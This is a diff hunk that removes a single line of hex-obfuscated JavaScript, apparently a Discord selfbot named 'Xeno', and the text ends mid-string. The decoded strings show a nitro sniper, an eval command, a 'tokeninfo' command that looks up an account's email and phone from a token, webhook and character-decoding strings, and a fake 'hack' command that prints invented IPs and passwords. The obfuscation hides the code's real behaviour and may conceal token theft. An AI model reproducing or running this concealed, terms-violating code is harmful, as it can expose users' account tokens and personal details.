@@ -1,1 +1,3505 @@
-var _0xa42d=["\x64\x69\x73\x63\x6F\x72\x64\x2E\x6A\x73","\x2E\x2F\x63\x6F\x6E\x66\x69\x67\x2E\x6A\x73\x6F\x6E","\x65\x6D\x62\x65\x64\x4F\x70\x74\x69\x6F\x6E\x73","\x6D\x6F\x6D\x65\x6E\x74","\x63\x6F\x6C\x6F\x72\x73","\x64\x65\x66\x61\x75\x6C\x74","\x61\x78\x69\x6F\x73","\x63\x6F\x6E\x73\x6F\x6C\x65\x2D\x74\x69\x74\x6C\x65","\x6E\x6F\x64\x65\x2D\x66\x65\x74\x63\x68","\x66\x69\x67\x6C\x65\x74","\x73\x75\x70\x65\x72\x61\x67\x65\x6E\x74","\x6E\x6F\x64\x65\x2D\x73\x75\x70\x65\x72\x66\x65\x74\x63\x68","\x63\x6F\x6D\x6D\x6F\x6E\x2D\x74\x61\x67\x73","\x40\x65\x78\x74\x72\x65\x6D\x65\x5F\x68\x65\x72\x6F\x2F\x64\x65\x65\x70\x74\x79\x70\x65","\x75\x74\x69\x6C","\x66\x73","\x77\x65\x62\x68\x6F\x6F\x6B\x2D\x64\x69\x73\x63\x6F\x72\x64","\x2E\x2F\x63\x75\x73\x74\x6F\x6D\x2F\x63\x6F\x6D\x6D\x61\x6E\x64","\x6C\x6F\x67","\x6C\x6F\x67\x45\x72\x72\x6F\x72","","\x5B\x45\x52\x52\x4F\x52\x5D\x3A","\x72\x65\x64","\x20","\x79\x65\x6C\x6C\x6F\x77","\x6C\x6F\x67\x43\x6F\x6D\x6D\x61\x6E\x64","\x5B","\x48\x48\x3A\x6D\x6D\x3A\x73\x73","\x66\x6F\x72\x6D\x61\x74","\x75\x74\x63","\x67\x72\x65\x65\x6E","\x5D\x20","\x43\x6F\x6D\x6D\x61\x6E\x64\x20\x75\x73\x65\x64","\x63\x79\x61\x6E","\x7C","\x6D\x61\x67\x65\x6E\x74\x61","\x35\x2E\x33\x2E\x31","\x58\x65\x6E\x6F","\x75\x6E\x68\x61\x6E\x64\x6C\x65\x64\x52\x65\x6A\x65\x63\x74\x69\x6F\x6E","\x6D\x65\x73\x73\x61\x67\x65","\x6F\x6E","\x75\x6E\x63\x61\x75\x67\x68\x74\x45\x78\x63\x65\x70\x74\x69\x6F\x6E\x4D\x6F\x6E\x69\x74\x6F\x72","\x75\x6E\x63\x61\x75\x67\x68\x74\x45\x78\x63\x65\x70\x74\x69\x6F\x6E","\x73\x6E\x69\x70\x65\x73","\x4C\x6F\x67\x67\x69\x6E\x67\x20\x69\x6E\x2C\x20\x70\x6C\x65\x61\x73\x65\x20\x77\x61\x69\x74\x2E\x2E\x2E","\x6E\x61\x6D\x65","\x20\x76","\x76\x65\x72\x73\x69\x6F\x6E","\x5D\x20\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E","\x72\x65\x61\x64\x79","\x63\x6C\x65\x61\x72","\x5D\x20\x4C\x6F\x67\x67\x65\x64\x20\x69\x6E\x20\x61\x73\x20","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x75\x73\x65\x72","\x0D\x0A\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2557\x20\x20\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557\x20\x20\x20\u2588\u2588\u2557\x20\u2588\u2588\u2588\u2588\u2588\u2588\u2557\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u255A\u2588\u2588\u2557\u2588\u2588\u2554\u255D\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u255A\u2588\u2588\u2588\u2554\u255D\x20\u2588\u2588\u2588\u2588\u2588\u2557\x20\x20\u2588\u2588\u2554\u2588\u2588\u2557\x20\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2554\u2588\u2588\u2557\x20\u2588\u2588\u2554\u2550\u2550\u255D\x20\x20\u2588\u2588\u2551\u255A\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\x20\x20\x20\u2588\u2588\u2551\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u2588\u2588\u2554\u255D\x20\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\x20\u255A\u2588\u2588\u2588\u2588\u2551\u255A\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u255A\u2550\u255D\x20\x20\u255A\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D\x20\x20\u255A\u2550\u2550\u2550\u255D\x20\u255A\u2550\u2550\u2550\u2550\u2550\u255D\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x0D\x0A\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x76","\x4C\x6F\x67\x67\x65\x64\x20\x69\x6E\x20\x61\x73","\x74\x61\x67","\x49\x44\x3A","\x69\x64","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x4E\x69\x74\x72\x6F\x20\x53\x6E\x69\x70\x65\x72\x3F","\x6E\x69\x74\x72\x6F\x5F\x73\x6E\x69\x70\x65\x72","\x45\x6E\x61\x62\x6C\x65\x64","\x44\x69\x73\x61\x62\x6C\x65\x64","\x47\x69\x76\x65\x61\x77\x61\x79\x20\x53\x6E\x69\x70\x65\x72\x3F","\x67\x69\x76\x65\x61\x77\x61\x79\x5F\x73\x6E\x69\x70\x65\x72","\x50\x72\x65\x66\x69\x78\x3A","\x70\x72\x65\x66\x69\x78","\x47\x69\x74\x48\x75\x62\x3A","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x58\x65\x6E\x6F\x2D\x53\x65\x6C\x66\x62\x6F\x74\x2F\x58\x65\x6E\x6F","\x44\x65\x76\x65\x6C\x6F\x70\x65\x72\x3A","\x58\x65\x6E\x6F\x23\x30\x35\x33\x38","\x0D\x0A\x20\x20\x20\x20","\x63\x72\x65\x64\x69\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x69\x6E\x76\x69\x74\x65\x2F\x46\x52\x47\x4B\x54\x4A\x73\x46\x4A\x67","\x50\x4C\x41\x59\x49\x4E\x47","\x73\x65\x74\x41\x63\x74\x69\x76\x69\x74\x79","\x6D\x65\x73\x73\x61\x67\x65\x4C\x6F\x67\x73","\x67\x75\x69\x6C\x64","\x20\x3A\x20","\x63\x68\x61\x6E\x6E\x65\x6C","\x62\x6C\x75\x65","\x61\x75\x74\x68\x6F\x72","\x63\x6F\x6E\x74\x65\x6E\x74","\x62\x6F\x74","\x73\x70\x6C\x69\x74","\x72\x65\x70\x6C\x61\x63\x65","\x73\x6C\x69\x63\x65","\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x77\x68\x69\x74\x65\x6C\x69\x73\x74\x65\x64","\x72\x61\x69\x6E\x62\x6F\x77","\x64\x65\x6C\x65\x74\x61\x62\x6C\x65","\x64\x65\x6C\x65\x74\x65","\x66\x69\x72\x73\x74","\x72\x6F\x6C\x65\x73","\x6D\x65\x6E\x74\x69\x6F\x6E\x73","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x72\x6F\x6C\x65","\x73\x65\x6E\x64","\uD835\uDE53\uD835\uDE5A\uD835\uDE63\uD835\uDE64","\x73\x65\x74\x46\x6F\x6F\x74\x65\x72","\x23\x66\x66\x30\x30\x30\x30","\x73\x65\x74\x43\x6F\x6C\x6F\x72","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x67\x79\x61\x7A\x6F\x2E\x63\x6F\x6D\x2F\x39\x61\x30\x31\x37\x37\x32\x36\x30\x39\x36\x36\x36\x63\x31\x38\x62\x30\x31\x32\x64\x66\x36\x65\x66\x65\x62\x33\x64\x35\x66\x38\x2E\x6A\x70\x67","\x73\x65\x74\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C","\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x6D\x61\x64\x65\x20\x74\x68\x65\x20","\x20\x72\x6F\x6C\x65\x20\x72\x61\x69\x6E\x62\x6F\x77","\x73\x65\x74\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x53\x75\x63\x63\x65\x73\x73","\x73\x65\x74\x54\x69\x74\x6C\x65","\x52\x41\x4E\x44\x4F\x4D","\x65\x64\x69\x74","\x74\x6F\x6B\x65\x6E\x69\x6E\x66\x6F","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x74\x6F\x6B\x65\x6E","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x6A\x73\x6F\x6E","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x49\x44\x2A\x2A\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x55\x73\x65\x72\x6E\x61\x6D\x65\x2A\x2A\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x44\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72\x2A\x2A\x20\xBB\x20","\x64\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x50\x75\x62\x6C\x69\x63\x20\x46\x6C\x61\x67\x73\x2A\x2A\x20\xBB\x20","\x74\x6F\x4C\x6F\x63\x61\x6C\x65\x53\x74\x72\x69\x6E\x67","\x70\x75\x62\x6C\x69\x63\x5F\x66\x6C\x61\x67\x73","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x46\x6C\x61\x67\x73\x2A\x2A\x20\xBB\x20","\x66\x6C\x61\x67\x73","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x45\x6D\x61\x69\x6C\x2A\x2A\x20\xBB\x20","\x65\x6D\x61\x69\x6C","\x4E\x6F\x6E\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x56\x65\x72\x69\x66\x69\x65\x64\x3F\x2A\x2A\x20\xBB\x20","\x76\x65\x72\x69\x66\x69\x65\x64","\x59\x65\x73","\x4E\x6F","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x4C\x6F\x63\x61\x6C\x65\x2A\x2A\x20\xBB\x20","\x6C\x6F\x63\x61\x6C\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x4E\x53\x46\x57\x3F\x2A\x2A\x20\xBB\x20","\x6E\x73\x66\x77\x5F\x61\x6C\x6C\x6F\x77\x65\x64","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x4D\x46\x41\x3F\x2A\x2A\x20\xBB\x20","\x6D\x66\x61\x5F\x65\x6E\x61\x62\x6C\x65\x64","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x50\x68\x6F\x6E\x65\x20\x4E\x75\x6D\x62\x65\x72\x2A\x2A\x20\xBB\x20","\x70\x68\x6F\x6E\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x76\x61\x74\x61\x72\x73\x2F","\x2F","\x61\x76\x61\x74\x61\x72","\x2E\x70\x6E\x67\x3F\x73\x69\x7A\x65\x3D\x32\x30\x34\x38","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x49\x44\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x55\x73\x65\x72\x6E\x61\x6D\x65\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x75\x62\x6C\x69\x63\x20\x46\x6C\x61\x67\x73\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x46\x6C\x61\x67\x73\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x45\x6D\x61\x69\x6C\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x56\x65\x72\x69\x66\x69\x65\x64\x3F\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4C\x6F\x63\x61\x6C\x65\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4E\x53\x46\x57\x3F\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4D\x46\x41\x3F\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x68\x6F\x6E\x65\x20\x4E\x75\x6D\x62\x65\x72\x20\xBB\x20","\x5C\x6E\x5C\x6E","\x5C\x60\x5C\x60\x5C\x60","\x74\x68\x65\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x61\x6E\x61\x72\x79\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x76\x36\x2F\x75\x73\x65\x72\x73\x2F\x40\x6D\x65","\x47\x45\x54","\x49\x6E\x76\x61\x6C\x69\x64\x20\x74\x6F\x6B\x65\x6E","\x63\x6F\x64\x65\x62\x6C\x6F\x63\x6B","\x6A\x73","\x74\x73","\x6C\x75\x61","\x63\x73\x73","\x68\x74\x6D\x6C","\x79\x61\x6D\x6C","\x70\x79","\x72\x75\x62\x79","\x6A\x61\x76\x61","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x74\x79\x70\x65\x2E\x20\x54\x79\x70\x65\x73\x3A\x20\x5C\x60","\x60\x2C\x20\x60","\x6A\x6F\x69\x6E","\x5C\x60","\x5C\x6E","\x5C\x6E\x5C\x60\x5C\x60\x5C\x60","\x43\x6F\x64\x65\x20\x42\x6C\x6F\x63\x6B","\x68\x61\x63\x6B","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6F\x6D\x65\x2D\x72\x61\x6E\x64\x6F\x6D\x2D\x61\x70\x69\x2E\x6D\x6C\x2F\x62\x6F\x74\x74\x6F\x6B\x65\x6E","\x67\x65\x74","\x55\x68\x20\x6F\x68\x2C\x20\x69\x74\x20\x6C\x6F\x6F\x6B\x73\x20\x6C\x69\x6B\x65\x20\x74\x68\x61\x74\x20\x74\x68\x65\x72\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x62\x6F\x64\x79\x20\x74\x6F\x20\x6C\x6F\x61\x64\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6E\x2E","\x75\x73\x65\x72\x73","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x75\x73\x65\x72\x20\x69\x64","\x48\x61\x63\x6B\x69\x6E\x67\x20","\x20\x6E\x6F\x77\x2E\x2E\x2E","\x34\x30\x2E\x32\x2E\x35\x34\x2E\x32\x33\x39","\x31\x34\x35\x2E\x35\x38\x2E\x31\x33\x34\x2E\x31\x34\x35","\x39\x30\x2E\x31\x33\x35\x2E\x38\x37\x2E\x31\x39\x39","\x32\x35\x31\x2E\x32\x32\x34\x2E\x37\x36\x2E\x39\x36","\x39\x34\x2E\x31\x39\x39\x2E\x31\x33\x39\x2E\x32\x35\x35","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x40\x67\x6D\x61\x69\x6C\x2E\x63\x6F\x6D","\x73\x75\x70\x70\x6F\x72\x74\x40\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D","\x40\x68\x6F\x74\x6D\x61\x69\x6C\x2E\x63\x6F\x6D","\x2E","\x40\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D","\x44\x69\x73\x63\x6F\x72\x64\x49\x73\x43\x6F\x6F\x6C","\x73\x65\x6C\x66\x62\x6F\x74\x73\x41\x72\x65\x41\x67\x61\x69\x6E\x73\x44\x69\x73\x63\x6F\x72\x64\x54\x4F\x53","\x59\x6F\x4D\x61\x6D\x61\x49\x73\x47\x61\x79","\x50\x61\x73\x73\x77\x6F\x72\x64","\x4D\x79\x50\x61\x73\x73\x77\x6F\x72\x64\x4A\x75\x73\x74\x47\x6F\x74\x4C\x65\x61\x6B\x65\x64","\x49\x20\x6C\x69\x6B\x65\x20\x79\x61\x20\x63\x75\x74\x20\x67","\x43\x61\x6E\x20\x79\x6F\x75\x20\x73\x65\x6E\x64\x20\x6D\x65\x20\x79\x6F\x75\x72\x20\x74\x6F\x6B\x65\x6E\x3F","\x43\x61\x6E\x20\x49\x20\x68\x61\x76\x65\x20\x79\x6F\x75\x72\x20\x62\x6F\x74\x73\x20\x73\x6F\x75\x72\x63\x65\x20\x63\x6F\x64\x65\x3F","\x20\x69\x73\x20\x6D\x79\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x74\x6F\x20\x6D\x79\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x61\x63\x63\x6F\x75\x6E\x74\x2E\x2E\x2E\x20\x3A\x66\x6C\x75\x73\x68\x65\x64\x3A","\x59\x6F\x75\x72\x20\x6D\x75\x6D\x20\x69\x73\x20\x73\x6F\x20\x75\x67\x6C\x79\x2C\x20\x74\x68\x61\x74\x20\x73\x68\x65\x20\x6D\x61\x64\x65\x20\x6D\x79\x20\x68\x61\x70\x70\x79\x20\x6D\x65\x61\x6C\x20\x63\x72\x79\x20\x3A\x73\x75\x6E\x67\x6C\x61\x73\x73\x65\x73\x3A","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x49\x50\x2A\x2A\x20\xBB\x20","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x45\x6D\x61\x69\x6C\x2A\x2A\x20\xBB\x20","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x50\x61\x73\x73\x77\x6F\x72\x64\x2A\x2A\x20\xBB\x20","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x55\x73\x65\x72\x6E\x61\x6D\x65\x2A\x2A\x20\xBB\x20","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x44\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72\x2A\x2A\x20\xBB\x20","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x49\x44\x2A\x2A\x20\xBB\x20","\x2A\x2A\x49\x6E\x6A\x65\x63\x74\x69\x6E\x67\x20\x76\x69\x72\x75\x73\x20\x69\x6E\x74\x6F\x20\x64\x69\x73\x63\x72\x69\x6D\x69\x6E\x61\x74\x6F\x72\x2A\x2A\x20\xBB\x20","\x2E\x2E\x2E","\x2A\x2A\x52\x65\x70\x6F\x72\x74\x65\x64\x20\x74\x6F\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x66\x6F\x72\x20\x73\x65\x6C\x66\x62\x6F\x74\x74\x69\x6E\x67\x2E\x2E\x2E\x2A\x2A","\x2A\x2A\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x72\x65\x70\x6F\x72\x74\x65\x64\x2A\x2A","\x2A\x2A\x46\x6F\x75\x6E\x64\x20\x54\x6F\x6B\x65\x6E\x2A\x2A\x20\xBB\x20","\x74\x6F\x6B\x65\x6E","\x2A\x2A\x46\x65\x74\x63\x68\x69\x6E\x67\x20\x44\x4D\x73\x2E\x2E\x2E\x2A\x2A","\x2A\x2A\x4D\x6F\x73\x74\x20\x63\x6F\x6D\x6D\x6F\x6E\x20\x73\x65\x6E\x74\x65\x6E\x63\x65\x2A\x2A\x20\xBB\x20","\x2A\x2A\x53\x6F\x6C\x64\x20\x61\x6C\x6C\x20\x66\x6F\x75\x6E\x64\x20\x64\x61\x74\x61\x20\x74\x6F\x20\x74\x68\x65\x20\x67\x6F\x76\x65\x72\x6E\x6D\x65\x6E\x74\x2E\x2E\x2E\x2A\x2A","\x2A\x2A\x43\x6F\x6D\x70\x6C\x65\x74\x65\x21\x2A\x2A","\x2A\x2A\x54\x68\x65\x20\x2A\x74\x6F\x74\x61\x6C\x6C\x79\x2A\x20\x72\x65\x61\x6C\x20\x68\x61\x63\x6B\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x63\x6F\x6D\x70\x6C\x65\x74\x65\x64\x21\x2A\x2A","\x63\x6C\x73","\x61\x66\x6B","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x65\x69\x74\x68\x65\x72\x20\x6F\x6E\x20\x6F\x72\x20\x6F\x66\x66\x2E","\x6F\x66\x66","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x76\x61\x6C\x69\x64\x20\x6F\x70\x74\x69\x6F\x6E\x2E\x20\x4F\x70\x74\x69\x6F\x6E\x73\x3A\x20\x6F\x6E\x2C\x20\x6F\x66\x66\x2E","\x41\x66\x6B\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x65\x6E\x61\x62\x6C\x65\x64\x2E\x20\x41\x66\x6B\x20\x6D\x65\x73\x73\x61\x67\x65\x3A\x20","\x61\x66\x6B\x5F\x6D\x65\x73\x73\x61\x67\x65","\x48\x65\x79\x20\x74\x68\x65\x72\x65\x2C\x20\x49\x20\x61\x6D\x20\x63\x75\x72\x72\x65\x6E\x74\x6C\x79\x20\x61\x66\x6B\x2E\x20\x54\x72\x79\x20\x64\x6D\x69\x6E\x67\x20\x6D\x65\x20\x6C\x61\x74\x65\x72\x21\x20\x3A\x73\x6C\x69\x67\x68\x74\x5F\x73\x6D\x69\x6C\x65\x3A","\x41\x66\x6B\x20\x6D\x6F\x64\x65\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x64\x69\x73\x61\x62\x6C\x65\x64\x2E","\x73\x6E\x69\x70\x65","\x54\x68\x65\x72\x65\x27\x73\x20\x6E\x6F\x74\x68\x69\x6E\x67\x20\x74\x6F\x20\x73\x6E\x69\x70\x65\x2E","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x44\x61\x74\x65\x2A\x2A\x20\xBB\x20","\x64\x61\x74\x65","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A\x50\x61\x67\x65\x2A\x2A\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x64\x69\x73\x70\x6C\x61\x79\x41\x76\x61\x74\x61\x72\x55\x52\x4C","\x73\x65\x74\x41\x75\x74\x68\x6F\x72","\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74","\x73\x65\x74\x49\x6D\x61\x67\x65","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x61\x74\x65\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x50\x61\x67\x65\x20\xBB\x20","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x65\x76\x61\x6C","\x27","\x22","\x68\x72\x74\x69\x6D\x65","\x2A\x2A\x4F\x75\x74\x70\x75\x74\x3A\x2A\x2A\x20\x5C\x60\x5C\x60\x5C\x60\x6A\x73\x5C\x6E","\x2A\x2A\x54\x79\x70\x65\x3A\x2A\x2A\x20\x5C\x60\x5C\x60\x5C\x60\x74\x73\x5C\x6E","\x69\x73","\x2A\x2A\x54\x69\x6D\x65\x20\x54\x61\x6B\x65\x6E\x3A\x2A\x2A\x20\x5C\x60\x5C\x60\x5C\x60\x5C\x6E","\x6D\x73\x5C\x6E\x5C\x60\x5C\x60\x5C\x60","\x0A","\x66\x72\x6F\x6D","\x6F\x75\x74\x70\x75\x74\x2E\x74\x78\x74","\x45\x72\x72\x6F\x72\x3A\x20\x5C\x60\x5C\x60\x5C\x60\x78\x6C\x5C\x6E","\x73\x74\x72\x69\x6E\x67","\x70\x61\x73\x73\x77\x6F\x72\x64","\x67\x69","\x72\x65\x70\x65\x61\x74","\x2A","\x77\x65\x62\x68\x6F\x6F\x6B\x55\x52\x4C","\x40","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x68\x61\x73\x74\x65\x62\x69\x6E","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x2E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x64\x6F\x63\x75\x6D\x65\x6E\x74\x73","\x68\x74\